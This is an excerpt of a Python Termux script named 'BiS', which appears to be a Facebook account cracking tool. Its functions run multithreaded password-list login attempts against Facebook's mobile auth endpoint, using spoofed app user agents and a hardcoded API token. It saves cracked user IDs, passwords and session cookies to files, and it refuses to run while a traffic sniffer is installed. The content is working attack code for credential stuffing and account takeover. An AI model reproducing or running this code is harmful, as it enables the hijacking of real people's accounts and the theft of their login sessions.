...
try:
	...
	if f'com.h{f}pc{g}y.pro' in file_d:
		print('\033[1;32m[×] Uninstall HttpCanary From Your Device ')
...
xxxx=" [FBAN/;FBAV/A1XDL5U4;FBBV/907310424;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/907310424;FBDM//*{density=1.5,width=1920,height=2560};FBLC/fr_FR;FBRV/377889903;FBCR/Nokia;FBMF/Xiaomi;FBBD/Realme;FBPN/com.facebook.katana;FBDV/HTC_Desire_21;FBSV/14;FBOP/8;FBCA/arm64-v8a;FBSS/20"

folder_path = '/sdcard/BiS'
try:
...
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
sys.stdout.write('\x1b]2; BiS \x07')
logo=(f"""\033[1;37m
＜￣｀ヽ、                            ／￣＞
      ゝ、      ＼    ／⌒ヽ,ノ     /´
              ゝ、  `（ ( ͡° ͜ʖ ͡°) ／
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mCloning ids Saved in BiS folder
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
def linex():
    print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
...
def Main_BiS():
		clear()
		print(f'\033[1;37m [1] CRACK FILE \n [2] CREAT FILE FB \n [3] UNBLOCk NETWORk IP \n [4] TELEGRAM (JOIN) \n [5] FOLLOW FB \n [0] EXIT')
		linex()
		...
		if shm =='1':
			...
			wp=(' ')
			os.system(f'xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
			Main_BiS()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi')
			Main_BiS()
...
def file_crack():
	...
	with tred(max_workers=30) as MAFIA:
		clear()
		tl = str(len(fo))
		print(' Total accounts : \033[1;37m'+tl)
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				BiS.submit(api1,ids,names,passlist)
			else:
				BiS.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
	...
	linex()
	input('\033[1;37m [*] Press enter to back \033[1;37m')
	os.system('python BiS.py')

def rd1(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m [BiS-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxx = "[FB4A/;FBAV/4Q095MQG;FBBV/756645988;FBAN/FB4A;FBAV/4Q095MQG;FBBV/756645988;FBDM//*{density=2.5,width=1440,height=1920};FBLC/es_ES;FBRV/895200481;FBCR/Nokia;FBMF/Xiaomi;FBBD/Gigaset;FBPN/com.facebook.katana;FBDV/Vivo_Y73s;FBSV/13;FBOP/5;FBCA/x86;FBSS/10;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/;FBAV/A1XDL5U4;FBBV/230346899;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/230346899;FBDM//*{density=2.0,width=2560,height=3840};FBLC/de_DE;FBRV/325119851;FBCR/Nokia;FBMF/Apple;FBBD/Calme;FBPN/com.facebook.katana;FBDV/Moto_G60;FBSV/13;FBOP/6;FBCA/arm64-v8a;FBSS/12;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [BiS-OK] '+uid+' | '+pas)
						print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'BiS_RND_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'BiS_COOKIEs.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [BiS-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'BiS_CP.txt')
...
def api1(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			xxx = "[FBAN/;FBAV/A1XDL5U4;FBBV/695439942;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/695439942;FBDM//*{density=3.0,width=1920,height=4096};FBLC/it_IT;FBRV/409935742;FBCR/Sony;FBMF/OnePlus;FBBD/YU;FBPN/com.facebook.katana;FBDV/Redmi_Note_9;FBSV/12;FBOP/5;FBCA/armeabi-v7a;FBSS/;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/;FBAV/;FBBV/524946737;FBAN/FBAN;FBAV/;FBBV/524946737;FBDM//*{density=2.0,width=2560,height=3840};FBLC/ru_RU;FBRV/597831363;FBCR/Nokia;FBMF/OnePlus;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Oppo_Reno_6;FBSV/14;FBOP/7;FBCA/arm64-v8a;FBSS/;]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'es_ES','client_country_code':'ES','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [BiS] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'BiS_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
...
def createip():
	os.system("cd && git clone https://www.facebook.com/profile.php?id=100003176234638&mibextid=JRoKGi")
	os.system('cd && cd BiS ;python BiS.py')
#####_____END_____#####
...
def create():
	...
	os.system('cd && cd FILE ;python BiS.py')
#####_____END_____#####
Main_BiS()
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.BiS.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.BiS.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python BiS.py')
        tks = ('Hello%20BiS%20Owner%20BiS%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+?text='+tks)
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20BiS%20Owner%20BiS-S%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213771372932?text='+tks)
        main_apv() 
main_apv()